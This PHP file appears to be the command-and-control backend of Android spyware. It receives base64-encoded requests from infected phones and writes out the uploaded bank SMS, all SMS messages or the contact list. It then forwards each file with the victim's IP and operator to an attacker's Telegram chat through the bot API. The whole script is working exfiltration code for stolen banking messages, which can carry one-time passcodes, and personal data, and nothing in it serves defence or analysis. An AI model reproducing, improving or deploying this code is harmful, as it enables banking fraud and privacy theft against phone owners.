<?php
include "Madsal.php";
function sendfile($text, $androidid, $filename)
{
    global $admin;
    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://api.telegram.org/bot' . TOKEN . '/sendDocument?chat_id=' . $admin,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => array(
            'document' => new CURLFILE("data/$filename"),
            'caption' => $text,
            'parse_mode' => 'HTML',
        ),
    ));
    curl_exec($curl);
    curl_close($curl);
}
$ip = $_SERVER['REMOTE_ADDR'];
$postdata = file_get_contents("php://input");
if (isset($_GET['data']) and strlen($postdata) > 1) {
    $data = json_decode(base64_decode($_GET['data']), true);
    $data = json_decode(base64_decode(str_replace($authtoken, "", $_GET['data'])), true);
    $action = isset($data['action']) ? $data['action'] : null;
    $messid = isset($data['messid']) ? $data['messid'] : null;
    $androidid = isset($data['androidid']) ? $data['androidid'] : null;
    $model = isset($data['model']) ? $data['model'] : null;
    $operator = isset($data['operator']) ? $data['operator'] : null;

    $data = json_decode(file_get_contents("users/$androidid.json"), true);
    $echoname = isset($data['name']) ? $data['name'] : $data['model'];
    if (file_exists("users/$androidid.json")) {
        if ($action == "banksms") {
            $name = $androidid . "_BankSMS.txt";
            file_put_contents("data/$name", $postdata);
            sendfile("🗂3 ᴅᴀʏꜱ ᴀɢᴏ ʙᴀɴᴋ ꜱᴍꜱ [ $echoname ].

📶ᴏᴘᴇʀᴀᴛᴏʀ : $operator
🌐ᴜꜱᴇʀ ɪᴘ : $ip
🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $androidid, $name, $panel);
            unlink("data/$name");
        } elseif ($action == "allsms") {
            $name = $androidid . "_AllSMS.txt";
            file_put_contents("data/$name", $postdata);
            sendfile("🗂ᴀʟʟ ꜱᴍꜱ ꜰɪʟᴇ [ $echoname ].

📶ᴏᴘᴇʀᴀᴛᴏʀ : $operator
🌐ᴜꜱᴇʀ ɪᴘ : $ip
🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $androidid, $name, $panel);
            unlink("data/$name");
        } elseif ($action == "allcontact") {
            $name = $androidid . "_Contacts.txt";
            file_put_contents("data/$name", $postdata);
            sendfile("🗂ᴀʟʟ ᴄᴏɴᴛᴀᴄᴛꜱ ꜰɪʟᴇ [ $echoname ].

📶ᴏᴘᴇʀᴀᴛᴏʀ : $operator
🌐ᴜꜱᴇʀ ɪᴘ : $ip
🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $androidid, $name, $panel);
            unlink("data/$name");
        }
    }}